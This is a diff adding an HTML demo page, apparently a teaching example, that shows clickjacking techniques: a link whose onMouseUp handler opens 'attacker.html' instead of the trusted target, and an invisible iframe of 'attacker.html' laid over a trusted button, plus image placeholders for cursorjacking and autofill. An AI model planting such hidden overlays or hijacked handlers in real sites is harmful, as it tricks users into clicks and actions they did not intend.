@@ -1,0 +1,73 @@
+<html>
+<head>
+<title>Trusted</title>
+<script>
+
+/* framebluster */
+
+/* window.onbeforeunload = function ()
+{
+    return "Asking the user nicely";
+}*/
+
+function win_open() {
+    window.open("attacker.html");
+}
+</script>
+
+<style type="text/css"><!--
+  *{
+    margin:0;
+    padding:0;
+  }
+  body {
+    background:#ffffff;
+  }
+  .button
+  {
+    padding:5px;
+    background:#6699CC;
+    left:275px;
+    width:120px;
+    border: 1px solid #336699;
+  }
+  #content {
+    width: 200px;
+    height: 200px;
+    margin-top: 50px ;
+    margin-left: 50px;
+  }
+  #clickjacking
+  {
+    position: absolute;
+    left: 0px;
+    top: 110px;  /* from 110 to 50 */
+    opacity:0.0; /* from 0.0 to 0.5 */
+  }
+//--></style>
+
+</head>
+<body>
+<h1>Example 1: onMouseUp</h1>
+<a onMouseUp="win_open()"
+ href="trusted.html"/>
+Go to the Trusted!</a>
+</br>
+</br>
+<h1>Example 2: iframe</h1>
+<div id="content">
+  <h1>Trusted</h1>
+  <input type="button" class="button" value="Go to the trused!">
+</div>
+<iframe id="clickjacking" src="attacker.html" width="200" height="200" scrolling="no" frameborder="none">
+</iframe>
+</br>
+</br>
+<h1>Example 3: cursorjacking</h1>
+<img src="cursorjacking.jpg"  alt="cursorjacking" height="400" width="800"/>
+</br>
+</br>
+<h1>Example 4: autofill</h1>
+<img src="autofill.jpg"  alt="autofill" height="400" width="500"/>
+</body>
+</html>
